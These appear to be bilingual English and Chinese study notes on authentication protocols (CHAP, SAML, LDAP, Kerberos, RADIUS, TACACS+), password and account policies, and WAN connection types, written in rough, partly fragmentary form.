The goal of CHAP is to allow the client to pass credentials over a public network (such as a phone or the Internet) without allowing attackers to intercept the data and later use it in an attack.
The client and server both know a shared secret (similar to a password) used in the authentication process.
  - client doesn’t send the shared secret over the network in plaintext as PAP does.
  - Instead, the client hashes it after combining it with a nonce (number used once) provided by the server.
  - This handshake process is used when the client initially tries to connect to the server, and at different times during the connection.
when users send their username and password to the server (encrypted), the server first authenticates the user.
Then once authentication is complete, the server directs the client computer to generate random number (often a cryptographic hash) and send that to the server (encrypted as well, of course).
Then the server will periodically challenge the client to reproduce that number/hash.
  - If the client session has been compromised, or not be unable to produce that number/hash, the server will terminate the session.
Microsoft has a proprietary version of this called MS-CHAP.
MS-CHAP and MS-CHAPv2
Microsoft Challenge Handshake Authentication Protocol (MS-CHAP)
an improvement over CHAP for Microsoft clients. MS-CHAP supported clients as old as Windows 95. Later, Microsoft improved MS-CHAP with MS-CHAPv2. A significant improvement of MS-CHAPv2:
  - the ability to perform mutual authentication.
  - client authenticate to the server
  - the server also authenticates to the client.
  - an attacker may try to impersonate a server.
  - Mutual authentication provides assurances of the server’s identity before the client transmits data, reduces the risk of a client sending sensitive data to a rogue server.
Authentication 鉴定
the verification of the identity of a person or process.
    - OpenID Connect
  - OATH
  - Kerberos
  - RADIUS
Authorization 授权
Accounting 记述
The tracking of the consumption of network resources by users tracking accessed services as well as the amount of consumed resources
Kerberos: sometimes referred to as an AAA protocol, but does not provide any accounting services.
Exploring Authentication Concepts
- Authentication: allows entities to prove their identity by using credentials known to another entity.
- Identification: occurs when a user claims or professes an identity, such as with a username, an email address, a PIV card, or by using biometrics.
- Authentication: occurs when an entity provides proof of an identity (such as a password). A second identity is the authenticator and it verifies the authentication.
- Authorization: provides access to resources based on a proven identity.
 the process of granting or denying access to resources
   - OAuTH
  - RADIUS
 - Accounting: methods track user activity and record the activity in logs.
Five factors of authentication are:
  - Something you know: username and password
  - Something you have: smart card, CAC, PIV, or
token
  - Something you are: biometrics, such as
fingerprints or retina scans
  - Somewhere you are: geolocation, a computer
name, or a MAC address
  - Something you do: gestures on a touch screen
shared secret: password or a PIN.
  - the least secure form of authentication.
Passwords should be strong and changed often.
Complex passwords include multiple character types. Strong
passwords are complex and at least 14 characters long.
Administrators should verify a user’s identity before resetting the user’s password. When resetting passwords manually, administrators should configure them as temporary passwords that expire after the first use, requiring users to create a new password the first time they log on. Self-service password systems automate password recovery. employ secure password practices.
- Password length specifies the minimum number of characters in the password.
- Password complexity ensures passwords are complex and include at least three of the four character types, such as special characters.
- Password history remembers past passwords and prevents users from reusing passwords.
- Minimum password age is used with password history to prevent users from changing their password repeatedly to get back to the original password.
- Maximum password age or password expiration forces users to change their password periodically. When administrators reset user passwords, the password should expire upon first use.
- Password policies should apply to any entity using a password. This includes user accounts and accounts used by services and applications. Applications with internally created passwords should still adhere to the organization’s password policy.
Account lockout policies lock out an account after a user enters an incorrect password too many times.
- Smart cards are credit card-sized cards that have embedded certificates used for authentication. They require a PKI to issue certificates. - Common Access Cards (CACs) and Personal Identity Verification (PIV) cards can be used as photo IDs and as smart cards (both identification and authentication).
Tokens / key fobs: display numbers in an LCD. These numbers provide rolling, one-time use passwords and are synchronized with a server. USB tokens include an embedded chip and a USB connection. Generically, these are called hardware tokens.
HOTP and TOTP: open source standards used to create one- time-use passwords.
  - HOTP creates a one-time-use password that does not expire.
  - TOTP creates a one-time password that expires after 30 seconds.
Biometric methods are the most difficult to falsify. Physical methods include voice and facial recognition, fingerprints, retina scans, iris scans, and palm scans. Biometric methods can also be used for identification.
The false acceptance rate (FAR) / false match rate, identifies the percentage of times false acceptance occurs.
The false rejection rate (FRR) / false nonmatch rate, identifies the percentage of times false rejections occur.
The crossover error rate (CER) indicates the quality of the biometric system. Lower CERs are better. - Single-factor authentication includes one or more authentication methods in the same factor, such as a PIN and a password. Dual-factor (or two-factor) authentication uses two factors of authentication, such as a USB token and a PIN. Multifactor authentication uses two or more factors. Multifactor authentication is stronger than any form of single- factor authentication.
- Authentication methods using two or more methods in the same factor are single- factor authentication. example, a password and a PIN are both in the something you know factor, so they only provide single-factor authentication.
Comparing Authentication Services Kerberos: network authentication protocol using tickets
issued by a KDC or TGT server.
  - If a ticket-granting ticket expires, the user might not
be able to access resources.
  - Microsoft Active Directory domains and Unix realms use Kerberos for authentication.
LDAP: specifies formats and methods to query directories.
  - It provides a single point of management for objects, such as users and computers, in an Active Directory domain or Unix realm. The following is an example of an LDAP string:
  - LDAP:// CN=Homer,CN=Users,DC=GetCertifiedGetAhead, DC=com
LDAP Secure (LDAPS) encrypts transmissions with SSL or TLS.
Single sign-on (SSO) allows users to authenticate with a single user account and access multiple resources on a network without authenticating again.
SSO can be used to provide central authentication with a federated database and use this authentication in an environment with different operating systems (nonhomogeneous environment).
SAML is an XML-based standard used to exchange authentication and authorization information between different parties. SAML is used with web-based applications.
- A federated identity links a user’s credentials from different networks or operating systems, but the federation treats it as one identity. that includes Open SAML libraries.
- OAuth and OpenID Connect are used by many web sites to streamline the authentication process for users.
  - They allow users to log on to many web sites with another account, such as one they’ve created with Google, Facebook, PayPal, Microsoft, or Twitter.
Managing Accounts
- The principle of least privilege is a technical control that uses access controls. It specifies that individuals or processes are granted only the rights and permissions needed to perform assigned tasks or functions, but nomore.
- Users should not share accounts. It prevents effective identification, authentication, authorization, and accounting. Most organizations ensure the Guest account is disabled.
- Account policies often require administrators to have two accounts (an administrator account and a standard user account) to prevent privilege escalation and other attacks.
- An account disablement policy ensures that inactive accounts are disabled. Accounts for employees who either resign or are terminated should be disabled as soon as possible. Configuring expiration dates on temporary accounts ensures they are disabled automatically.
- Time restrictions can prevent users from logging on or accessing network resources during specific hours.
Location-based policies prevent users from logging on from certain locations.
- Accounts should be recertified to verify they are still required.
example, if the organization extends a contract, it’s a simple matter to recertify the account. Administrators verify that the contract has been extended, change the expiration date, and enable the account.
- Administrators routinely perform account maintenance. This is often done with scripts to automate the processes and includes deleting accounts that are no longer needed.
- Credential management systems store and simplify the use of credentials for users. When users access web sites needing credentials, the system automatically retrieves the stored credentials and submits them to the web site.  variety of applications running on different systems
account lockouts
reduce the number of
due to a
Single Sign-On (SSO)
- a centralized access control technique
- allows a subject to be authenticated only once on a system and to access multiple resources without authenticating again.
  - Example
  - authenticate once on a network, then access resources throughout the
network without being prompted to authenticate again.
- advantage:
  - convenient and increases security. (avoid writing down password)
  - easier administration: reducing the number of accounts required for a
subject.
- The primary disadvantage:
  - once an account is compromised, an attacker gains unrestricted access to all of the authorized resources.
  - However, most SSO systems include methods to protect user credentials.
An organization finds that most help desk calls ate regarding account lockout . solution to
while improving security: SSO
  Shibboleth:
  - a single sign-on system used widely on the Internet. ▪


##   - The Shibboleth system uses SAML.
SAML Security Assertion 断言 Markup Language
a standard for logging users into applications based on their
sessions in another context.
This single sign-on (SSO) login standard has significant advantages over logging in using a username/password, to use this information to log users in to other applications, such as web-based applications, one way of doing this is by using SAML.
Security Assertion Markup Language (SAML) is an open standard that defines a XML-based framework for exchanging authentication and authorization information between an identity provider (IdP) and a service provider (SP), to enable web-based single sign-on (SSO) and identity federation.
An XML-based markup language, much like HTML.
  - HTML: defining web page elements
  - SAML: It uses tags, defines security authorization.
       - used to exchange authentication and authorization information between identity providers and service providers.
Commly used for federated identity management across mulyiple organizations.
 ▪


##   An SSO solution used for web-based application
- Example:
- A secure web portal accessible to user by username and password, use SAML to support authentication.
  - Portal: service provider, request an authentication assertion
  - back-end networks: function as an identity provider and issue an authentication assertion
SAML在单点登录中大有用处:
仧 在SAML协议中，一旦用户身份被主网站(身份鉴别服务器，Identity Provider，
IDP)认证过后，该用户再去访问其他在主站注册过的应用(服务提供者，Service Providers，SP)时，都可以直接登录，而不用再输入身份和口令。
- SAML:
  - often used in federation / web browser single sign-on implementations.
   - Allows an application to securely authenticate a user by receiving credentials from a web domain.
  - (TACACS+, RADIUS, Kerberos cannot do this)!!!  用户登录 SP，SP 向 IDP 发起请求来确认用户身份为例子
仧 比如SP是Google的Apps，IDP是一所大学的身份服务器，
Alice 是该大学的一名学生。     Federated Identity Management and SSO
- SSO: common on internal networks, not Internet.
  - But for cloud-based applications, it added a need for an SSO solution for
users accessing resources over the Internet.
⁃
a single set of authentication credentials provides
access to multiple systems within a single organization
- Federated identity management/ federated authentication   - A form of SSO that meets this need.
  - Manage user identities and their credentials.
  - Multiple organizations can join a federation/group, where they agree on a
method to share identities between them.
⁃
a single set of authentication credentials provides
access to multiple systems across different
organizations
  - Users in each organization log on:
  - once in their own organization and credentials are matched with a
federated identity.
  - Users use this federated identity to access resources in other
organization in the group.
  challenge with multiple companies communicating in a federation is finding a common language.
different operating systems need to share a common language.
Federated identity systems often use the Security Assertion Markup Language (SAML) and/or the Service Provisioning Markup Language (SPML) to meet this need.
  - Hypertext Markup Language :
  - commonly used to display static web pages.
  - was derived from the Standard Generalized Markup Language
(SGML) and the Generalized Markup Language (GML).
  - describes how data is displayed using tags to manipulate the size
and color of the text.
  - Example:
  - H1 tag: displays the text as a level one heading:
  - <H1>I Passed The CISSP Exam</H1>
  - Extensible Markup Language :
  - describing how to display the data by actually describing the data.
  - can include tags to describe data as anything desired.
  - Example:
  - identifies the data as the results of taking an exam:
  - <ExamResults>Passed</ExamResults>
  - Security Assertion Markup Language (SAML) :
  - an XML- based language
  - commonly used to exchange authentication and authorization (AA)
information between federated organizations.
  - often used to provide SSO capabilities for browser access.
  - Service Provisioning Markup Language (SPML) :
  - a newer framework based on XML
  - specifically designed for exchanging user information for federated
identity single sign-on purposes.
  - based on the Directory Service Markup Language (DSML), which can display LDAP-based directory service information in an XML format.
  - Extensible Access Control Markup Language (XACML) :
  - used to define access control policies within an XML format
  - commonly implements role-based access controls.
  - It helps provide assurances to all members in a federation that they
are granting the same level of access to different roles. Federation:
2 company cannot be merged into each domain infrastructure, but can share access one another’s resoureces.
 commonly used solution for tracking user access in a federated SSO system: Secure token
LDAP Lightweight Directory Access Protocol 轻量目录访问协议。
- a standardized directory access protocol (open, cross-plantform, vendor- neutral, industry standard application protocol) for accessing and maintaining distributed directory information services over IP network.
仧 LDAP服务是一个为只读(查询、浏览、搜索)访问而优化的非关系型 数据库，呈树状结构组织数据。
仧 LDAP主要用做用户信息查询(如邮箱、电话等)或对各种服务访问做 后台认证以及用户数据权限管控。
  - A common use of LDAP is to provide a central place to store usernames and passwords. allows many different applications and services to connect to the LDAP server to validate users.
  - Users, clients, and processes can search the directory service to find where a desired system or resource resides. ▪


##    - Subjects must authenticate to the directory service before performing queries and lookup activities.
  - Even after authentication, the directory service will reveal only certain information to a subject, based on that subject’s assigned privileges.
centralized access control system: often used in a single organization
  - Example:
  - a directory service is a centralized database includes information
about subjects and objects. Many directory services are based on the
Lightweight Directory Access Protocol (LDAP).
  - the Microsoft Active Directory Domain Services is LDAP based.
  - an authentication service based on the X.500 specification
- LDAP) is an X.500- based authentication service used to identify objects.
- allows queries to be made of directories (specifically, pared-down X.500- based directories).
- If a directory service supports LDAP, you can query that directory with an LDAP client.
- DAP ran on the OSI protocol stack
  - LDAP is lightweight, uses TCP/IP (tcp/389 and udp/389).
- LDAP is growing in popularity, used in online white and yellow pages.
LDAP is the main access protocol used by Active Directory. It operates, by default, at port 389.
The LDAP syntax uses commas between names.
   ▪


##  LDAP user access and security
Simple Authentication and Security Layer (SASL)   - No authentication
  - Anonymous access is granted   - Simple authntication
  - Client provides DN and Passwd(plaintext)   - SASL
  - Client and server negotiate a security mechanism (kerberos, TLS...)
Usually 2 levels of access
  - Read only (query the info)
  - Read-write (update the info)
Check the firewall! (Tcp/udp 389)
    LDAP over SSL (LDAPS)
LDAP is transferres in clear text. (Sniffer and retrieved)
secure LDAP (LDAPS), port 636
  - breach of LDAP can be quite serious, some organizations use secure
LDAP .
  - LDAPS: all LDAP communications are encrypted with SSL/TLS.
  - a TLS-based directory access protocol
       - Ensure LDAP traffic cannot be monitored or sniffed and maintains
compatibility with LDAP clients
  - Generate an X 509-complaint certificate that is signed by a ▪


##  trusted CA.
  - Ensure port 636 is open between the clients and the servers using the communication.
  Example of authentication: specifics a LDAP module for single sign-on
communication with the company's access control database.
- May need to filter non-encrypted LDAP, as some LDAP cannot disable it. ▪


## LDAP and Centralized Access Control
Multiple domains and trusts are commonly used in access control systems.
A security domain is a collection of subjects and objects that share a common security policy, and individual domains can operate separately from other domains.
  - Trusts are established between the domains to create a security bridge and allow users from one domain to access resources in another domain.
  - Trusts can be one way only, or they can be two way.
LDAP and PKIs
A Public Key Infrastructure (PKI) uses LDAP when integrating digital certificates into transmissions.
  - PKI is a group of technologies: used to manage digital certificates during the certificate life cycle.
There are many times when clients need to query a certificate authority (CA) for information on a certificate and LDAP is one of the protocols used.
LDAP and centralized access control systems can be used to support single sign- on capabilities.
Protocol overview
A client starts an LDAP session by connecting to an LDAP server, called a Directory System Agent (DSA), by default on TCP and UDP port 389, or on port 636 for LDAPS (LDAP over SSL, see below).
The client then sends an operation request to the server, and a server sends responses in return. With some exceptions, the client does not need to wait for a response before sending the next request, and the server may send the responses in any order. All information is transmitted using Basic
     X.500 distiguished names
 - Attribute = value pairs
  - CN | Common Name | identifies the person object
  - OU | Organization Unit | a unit or departemnt within the
organization
  - O|
  - L|
  - ST|
  - C|
  - DS|
domain
- Hierarchical structure
Origanization Locality
State
| the name of the organization | usaually city or area
| city, province
| the contrys 2 character ISO code
Country
Domain Component | conponents of the object’s ▪


##  Kerberos
popular authentication protocol, a common standard in network environments. Originally designed by MIT
Ticket authentication: a mechanism that employs a third-party entity to prove identification and provide authentication.
  - The most common and well-known ticket system is Kerberos
  - Authorize both users and systems.
Uses private-key cryptography (symmetric-key cryptography) for providing authentication across open networks
  - Developed before the popularity of public-key cryptography and systems like SSL Mediates authentication through a trusted 3 rd party (key distribution center KDC)
       different to radius, diameter
  - Only Kerberos can do Mutual Authentication and Delegation.
  - It uses tickets to identify authenticated users
  ▪


##  Kerberos principals
Clients (users or services) are identified by “principals”
Principals look like: primary / instance @realm
  - Primary: user / service name
  - Instance: optional for user principals, but required for service principals
  - Realm: the Kerberos realm
  - The Kerberos administrative domain
  - typically the domain's DNS name in all caps
  - “foo.com” becomes “FOO.COM”
Examples:
  - User: joe@FOO.COM
  - Service: imap/bar.foo.com@FOO.COM
Kerberos authentication:
uses key distribution center (KDC) to orchestrate the process.
   - ▪


##  the trusted third party that provides authentication services. Authentication mediated through a central server.
key distribution center (KDC): consists of 2 parts:
Authentication Server (AS):
  - verifies or rejects the authenticity and timeliness of tickets.
  - Issues “Ticket-Granting Tickets” (TGT):
  - provides proof that a subject has authenticated through a KDC and is authorized to request tickets to access other objects.
  - A TGT is encrypted and includes: a symmetric key, expiration time, user’s IP address.
  - Subjects present the TGT when requesting tickets to access objects.
Ticket Granting Server (TGS):
  - it is possible to host the ticket- granting service on another server
  - Issues service tickets.
All clients and servers are registered with the KDC
- KDC maintains the secret keys for all network members.
The KDC authenticates the principal (user, program, or system) and provides it with a ticket (use to authenticate against other principals)
- ticket granting ticket (TGT):
  - ticket is encrypted, has a time limit of up to 10 hours.
  - The ticket lists the privileges of that user (much like a token).
     ▪


##   - is a ticket used to grant other tickets. Authentication process:
A user logs in to the computer, access resource on the network, client sends (a user name and server name) to the KDC
  - The client first asks the KDC (which holds the AS and TGS) for a ticket, which will be used to authenticate throughout the network.
  - This request is in clear text.
The KDC replies (a ticket TGT and session key) (encrypted with user's password)
  - The server will respond with a secret key, which is hashed by the password copy kept on the server (in Active Directory). This is known as the TGT.
client get TGT.
  - decrypts the TGT (by user's password)
  - The TGT is used to talk to the KDC to obtain service tickets.
client presents TGT to KDC:
  - If the client can decrypt the message, the TGT is sent back to
the KDC server requesting a TGS service ticket.
KDC then responds with a service ticket to client (granting the user access to that service) and the client is allowed to log on and access network resources.
The user sends a request to the protected resource.
  - Access Gateway redirects the request to Identity Server for authentication.
         - The client sends a request to Identity Server.
  - Identity Server sends the 401 unauthorized response.
  - The client sends a request with the Kerberos service ticket to Identity Server.
  - Identity server:
  - decrypts the Kerberos service ticket using the key tab file
  - performs an LDAP search with user principle name.
  - receives the success status for the LDAP search,
  - the user authentication is completed successfully.
  - Identity Server redirects the response to Access Gateway.
  - The client gets access to the protected resource.
  NTP Network Time Protocol: reliability of the Kerberos authentication process
Service tickets: only good for up to 5 minutes.
  - T he user’s computer sends the service ticket to the server to
access.
  - Final authentication check: server communicates with the TGT to confirm and validate the service ticket.   - Once a ticket expires, a client must request a renewal or a new ticket to continue communications with any server.
This process occurs automatically when another principal performs a request or service.
Benefits:
- Standards-based strong authentication
- Broad operating-system support
- Provides for single sign-on (SSO) capability:
- Passwords never traverse the network
  - Password guessing more difficult
- Stolen authentication tickets are hard to reuse
    - allows for a single sign-on to a distributed network and provides protection for logon credentials. weakness: can be a single point of failure.
- If the KDC goes down, the authentication process will stop.
User command example
 Preparing for Kerberos Prerequisites
  - Configure NTP (time synchronization) across all machines
  - Kerberos depends on accurate and usable timestamps
  - Configure DNS
  - Kerberos requires fully qualified domain names (FQDN) that are
resolvable in both forward and reverse directions for all servers
  - Special DNS zone configurations can simplify Kerberos client
configurations  ⁃
  - Configuring the KDC
  - Configuration files
  - – /etc/krb5.conf
  - – /etc/kadm5.acl
   -   - Prepare the Kerberos database
  - – Initialize the Kerberos database
  - – Add administrator's principal
  - – Start the KDC and KDC administration processes
 ⁃
  - Create user principals
  - – Note: service principals are created when configuring your other services to support Kerberos authentication
 ⁃
  - Configuring Kerberos clients
  - Configuration file
  - – /etc/krb5.conf
  - – You can just copy this from the KDC
  - Service principals Kerberos authentication (i.e. remote access, e-mail)
  - – Involves creating the principals, then adding them to the
client's “keytab” file
 ⁃
  - PAM (Pluggable Authentication Modules)
  - – Needed if you want to be able to authenticate users logging into this machine via Kerberos
 ⁃
Common user commands
kinit – Obtain and cache Kerberos ticket-granting ticket – Used to authenticate with the KDC klist – List cached Kerberos tickets
kdestroy – Destroy Kerberos tickets – Used to clear out the ticket cache
kadmin – Kerberos database administration program
ktutil – Kerberos keytab file maintenance utility ▪


## RADIUS Remote Authentication Dial-In User Service 用户远程拨入认证服务
a mechanism
centralizes authentication for remote connections.
  - 主要针对的远程登录类型有:SLIP、PPP、telnet和 rlogin等。
  - 应用范围很广，包括普通电话、上网业务计费，对VPN 的支持可以使不同的拨入服务器的用户具有不同权限。
  - Because of the broad support and the ubiquitous nature of the RADIUS protocol, used by ISPs and enterprises to manage access to the Internet / internal / wireless networks, and integrated e-mail services. These networks may incorporate modems, DSL, access points, VPNs, network ports, web servers, etc.
allows authentication of remote and other network connections.
  - Example:
   ▪


##   - when organization has lots network/remote access server.
  - Originally intended for use on dial-up connections, it has moved well
beyond that and offers many state-of-the-art features.
  - Instead of each individual VPN server needing a separate database to identify who can authenticate, the VPN servers forward the authentication requests to a central RADIUS server.
  - RADIUS can also be used as an 802.1x server with WPA2 Enterprise mode.
Imagine your company:
 Each location has a VPN server that users can access.
- traveling salesman can connect to any of these VPN servers.
- Bart was prompted to change hispassword.
  - If each VPN server has a separate database with Bart’s username and password, each of these databases must be updated.
  - labor intensive and needless errors.
- However, the company could use a centralized RADIUS server, each VPN server configured with a shared secret (similar to a password) and the RADIUS server is configured with a matching shared secret for each of the VPN servers.
This centralized RADIUS server could hold a centralized database of user accounts.
  - However, it is more common for the RADIUS server to access an 3,000

LDAP server that holds the accounts.
  - in a Microsoft domain, the RADIUS server would pass the credentials
to a domain controller.
- Benefit: only one account for the user.
- If Bart changes his password, the domain controller knows the new password.
The RADIUS protocol is an IETF standard
has been implemented by most of the major operating system manufacturers.
  - user can connect to any network access server (RADIUS client)
  - network access server then passes on the user’s credentials to the RADIUS
server
  - RADIUS server:
  - acts as an authentication server.
  - verify authentication and authorization and to track accounting.
  - The RADIUS server also provides AAA services for multiple remote access servers.
  - A RADIUS server can be managed centrally, and the servers that allow access to a network can verify with a RADIUS server whether an incoming caller is authorized.
   - RADIUS federation: include 802.1x that pre-authenticates the devices.
  - when a user logs into the network, the authentication server communicates to the network switch and assigns the user to the proper VLAN.
  - Provide seamless wireless access for their employees as they visit the other organization.
In a large network with many connections, this allows a single server to perform all ▪


## authentications.
 Figure 4.24 shows an example of a RADIUS server communicating with an ISP to allow access to a remote user. Notice that the remote ISP server is functioning as a client to the RADIUS server. This allows centralized administration of access rights.
use RADIUS:
improve network security by implementing a single service to authenticate users
who connect remotely to the network.
  - gives you a single source for the authentication to take place.
RADIUS uses the User Datagram Protocol (UDP)
  - provides a best-effort delivery mechanism.
  - includes logic to detect communication problems.
  - RADIUS alternatives use TCP
  - guaranteed delivery.
  - allow TCP to detect and handle communication issues.
  characteristic features of RADIUS
    - RADIUS Primarily used for network access    - TACACS+: device administration
  - RADIUS Combines authentication and authorization
  - can implement auditing and accounting on the RADIUS server.
  - TACACS+: Separates authentication and authorization
  - Encrypts only the password in the access-request packet
  - TACACS+: the entire payload
⁃
RADIUS does work with EAP.
  - However, alternatives make it easier to extend the use of EAP.
To ensure credentials are encryptedin transit when use RADIUS se rver for SSO.
  - Public key and private key.
The major difficulty with a single-server RADIUS environment is that the entire network may refuse connections, if the server malfunctions.
Many RADIUS systems allow multiple servers to be used to increase reliability.
All of these servers are critical components of the infrastructure, and they must be protected from attack.
  Diameter
Building on the success of RADIUS and TACACS+,   - an enhanced version of RADIUS,
  - 替代RADIUS
supports a wide range of protocols, including traditional IP, Mobile IP, and Voice over IP (VoIP). Because it supports extra commands, it is becoming popular in situations where roaming support is desirable, such as with wireless devices and smart phones.
Benefit:
  - Diameter adds several other commands beyond the capabilities of
RADIUS, along with adding new commands that can be used with EAP.
  - backwards compatible with RADIUS and provides an upgrade path
from RADIUS to Diameter. Diameter:
  - uses TCP port 3868 or Stream Control Transmission Protocol (SCTP) port 3868,
  - uses TCP instead of UDP used by RADIUS.
  - providing better reliability than UDP used by RADIUS.
It also supports Internet Protocol Security (IPsec) and Transport Layer Security (TLS)
for encryption.  In geometry, the diameter of a circle is a straight line between the two edges of a circle, whereas the radius is a straight line from the center to an edge.
In other words, the diameter of a circle is twice as long as the radius.
The designers considered this when naming Diameter to indicate indirectly that it is twice as good as RADIUS. TACACS+ Terminal Access Controller Access-Control System
- an alternative to RADIUS.
  - Cisco later introduced extended TACACS (XTACACS) as a proprietary
protocol.
  - However, TACACS and XTACACS not commonly used today.
  - It provides security benefits over RADIUS:
  - encrypts the entire authentication process, whereas RADIUS encrypts only the password.
  - TACACS+ uses multiple challenges and responses between the client and the server.
  - Organizations also use TACACS+ as an authentication service for network devices.
  - use it to authenticate users before they are able to access a configuration page for a router or a switch.
  - The network devices must be TACACS+ enabled, and a TACACS+ server provides the authentication services.
Although TACACS+ is proprietary to Cisco, it can interact with Kerberos.
- This allows a Cisco VPN concentrator to interact in a Microsoft Active Directory environment.
- As a reminder, Microsoft Active Directory uses Kerberos for authentication.
TACACS Plus (TACACS+) was later created
  - an open publicly documented protocol
  - the most commonly used of the three.
   - Can be used to control specific commands that can be executed on a network infrastructure device.  Foundation Topics WAN Properties
- To select an appropriate WAN technology for a network you are designing, or to better understand a WAN technology in a currently installed network,
- you need the ability to compare one WAN technology to another.
- This section identifies a collection of WAN connection properties that
can be used to contrast various WAN technologies.
WAN Connection Types
Some WAN connections/technologies:
always on: the connection is always available (do not have to first set up
the connection.)
on demand: the connection is not established until needed. when needed,
it is brought up.
Another distinguishing characteristic of WAN connections is whether multiple users share bandwidth:
Example
some WAN connections provide dedicated bandwidth to customer, other WAN connections allow multiple customers to share a common
pool of available bandwidth.
A WAN connection can generally be classified into 3 categories:
dedicated leased line, circuit-switched connection packet-switched connection:
廣域網路封裝協定與連線種類的關係
- WAN:
◦ Dedicated: Leased Line:HDLC , PPP, SLIP, (T1/E1, T3/E3, DSL) ◦ Switched:
▸ Packet Switched: HDLC, X.25, Frame Relay,
▸ Circuit Switched: HDLC , PPP, SLIP (PSIN,ISDN) ▸ Cell switched: ATM SMDS Dedicated leased line: Connection interconnecting two sites.
might physically connect through a service provider’s facility or a telephone company’s central office (CO).
優缺點:
The expense is higher than other WAN technologies offering similar data
rates,
because a customer does not have to share bandwidth with other
customers.
保證頻寬，獨享頻寬，不會與其他網路共享，速度則可以達到45Mbps 。 Example:
a T1 circuit, dedicated leased line technology commonly found in North America.
common Layer 2 protocol that could run over a dedicated leased line:   - Point-to-Point Protocol (PPP).
Circuit-switched connection:
Connection brought up on an as-needed basis, on-demand bandwidth.
Integrated Services Digital Network (ISDN) can operate as a circuit- switched connection, bringing up a virtual circuit (VC) on demand.
特点:
can save cost for who only need periodic connectivity to a remote site.
终端系统之间需要预约传输线路资源才可以进行持续的通讯，通讯过程中 传输速率保持一个常数值。是一种电路资源预分配的方式.
 由于资源已经预先分配，因此在通讯结束之前，不管用户之间是否一直在
   传输信息，这条电路始终被这一对用户占用。
使用這種廣域網路時，傳輸過程中整個網路連線都必須存活，有點類似撥 接。事實上，這就是「Dial On Demand 」的網路類型，ISDN 以及現 在各位使用的電話就是這種網路。
  - 以電話為例，當想與聯絡，一開始必須先撥號，當撥接成功之 後，通訊過程中連線都不能中斷，否則整個連線中斷，而且也只 有在要交換資訊時才撥號 Dial On Demand 。
  - 電話這種網路，也稱為PSTN 。
  - 關於電話網路、ISDN 以及Dial On Demand 這種網路類型，在
     未來的文章中會特別再做介紹。 Circuit的实现有两种方式: frequency-division multiplexing(FDM) time-division multiplexing(TDM)
Packet-switched connection:
Similar to a dedicated leased line, because most are always on. (Unlike dedicated
leased line)
allow multiple customers to share a service provider’s bandwidth.
跟circuit switching不同，packet switch不需要预约的，每个connection是竞争 关系，线路资源先到先得。
Packet:
在packet switching中，传输方(source)将要传输的⻓信息分成若干小块
packet,在传输过程中按数据包传输。
大多数的packet switching采取store-and-forward的传输策略:
⁃
  - ⁃
在发送数据包的第一个比特之前，switch 必须已经接收到这个数 据包的所有比特，即完整的数据包。
于是因为switch需要等待整个包的到来才发送数据,延时产生。 例子:
◦ 在 packet switched的网络中，
◦ host A要传输一个 L bits 的数据包给B，
◦ A、B之间有Q条线路，每条线路的传输速率为R bps，
◦ 这个数据包是这个网络中唯一传输的数据。
◦ 因为A、B之间有Q条线路，所以A、B间共有Q-1个
routers，即算上A，这个数据包一共要被发送Q次，每一次 都store-and-forward，因此每一次都产生一个延时，延时时 间为L/R s。
◦ 为什么是L/R呢?
L/R: 传输 L bits 的数据包需要的时间 当数据包的第一个bit被发送到下一个router，这个router收 bit就要等待L/R的时间，而且这是这个数据包的比特
要等待的最⻓时间，因此延时时间就是L/R秒。 所以，整个过程的总延时时间为:Q*L/R s。
Output Buffer (Output Queue):
在packet switching中，每一个switch会与多条线路连接。 Switch为每条线路的数据传输提供一个输出缓冲区(output buffer/output
queue)
  - 当多条线路都有数据包传出时，第一个到达switch的数据包会立
刻被发送，其余数据包就会按照到达顺序进入缓冲区，然后根据 先进先出策略发送出去。因此这里也会产生一个延时，称为 queuing delay。
  - 如果当这个缓冲区满了后仍有数据包到达switch，这个数据包或 者缓冲区中的某一数据包就会被丢弃，至于丢弃谁就要根据特定 策略，这个丢弃的过程就称为queue loss。
service-level agreement (SLA):
Even though bandwidth is being shared among customers, customers can
purchase SLA:
which specifies performance metrics (like available bandwidth and maximum
delay) guaranteed for a certain percentage of time.
Example: an SLA might guarantee a customer that he has a minimum of 256
kbps of bandwidth available 80 percent of the time. Frame Relay: an example of a packet-switched connection.
allows multiple customers to connect to a service provider’s network
and virtual circuits (VC) logically interconnect customer sites. Asynchronous Transfer Mode (ATM):
often categorized as a packet-switched connection.
However, to be technically accurate, ATM is a cell-switched connection, because
ATM uses fixed-length (53 byte) cells, as opposed to variable-length frames. These connection types are meant to be general categories, but not all WAN
technologies will strictly meet the previous definitions. Example:
  - digital subscriber line (DSL):
  - a technology that could be configured for on-demand access
(like a circuit-switched connection) or it could be configured for always-on access.   - typically provides a customer with an amount of bandwidth that the customer does not have to share with other customers (like a dedicated leased line).
  - However, uses ATM technologies to connect back to the service provider’s equipment (like a cell-switched connection).
WAN Data Rates
WAN links are typically faster than LAN links; however, some WAN technologies (like fastest Synchronous Optical Network [SONET]) boast a bandwidth capacity in the tens of Gbps.
- One could argue that some of these higher-speed WAN technologies are actually metropolitan-area network (MAN) technologies. However, this chapter considers a WAN to be an interconnection of geographically dispersed networks, which also encompasses MAN technologies.
- Aside from measuring bandwidth in kbps, Mbps, or Gbps, high-speed optical networks often use optical carrier (OC) levels to indicate bandwidth.
- ◦ ◦ ◦ •
WAN Media Types
- WAN links
◦ might be physical hardwired links
▸ service provider’s site - copper or fiber-optic cable - the remote site/your site
◦ wireless.
▸ These wireless solutions might be appropriate for locations
where more conventional WAN technologies are unavailable or for accommodating the needs of mobile users.
Physical Media
- The physical media used for WAN connections is similar to the physical media found in LAN connections:
◦ Unshielded twisted pair (UTP):
As a base reference point:
OC-1: 51.84 Mbps.
Other OC levels, simply multiples OC-1.
OC-3 link = 3*OC-1 link (3 * 51.84 Mbps = 155.52 Mbps).
a variety of speeds are available from different service providers, typical bandwidths of several common WAN technologies: ▸ Both analog and digital circuits coming into your location from a CO commonly use UTP cabling.
▸ This cabling might be Category 3 (Cat 3) cabling, as opposed to higher categories used in LANs.
▸ Examples of WAN technologies using UTP cabling:
- T1 circuits DSL connections
- dial-up analog modems ISDN circuits.
◦ Coaxial cable:
▸ A common residential WAN solution is cable modem (primarily for connecting out to the Internet)
▸ A cable modem uses a coaxial 同轴的 cable, 4 layer for transmission. Not UTP or TP. (like RG-6 coaxial cable)
▸ In fact, the same coaxial cable providing a variety of television might also be used to carry data (upstream and downstream) using specific frequency ranges.
◦ Fiber-optic cable:
▸ WAN connections need a high bandwidth capacity or needing to span a large distance.
▸ Another benefit: immunity from electromagnetic interference (EMI).
◦ Electric power lines:
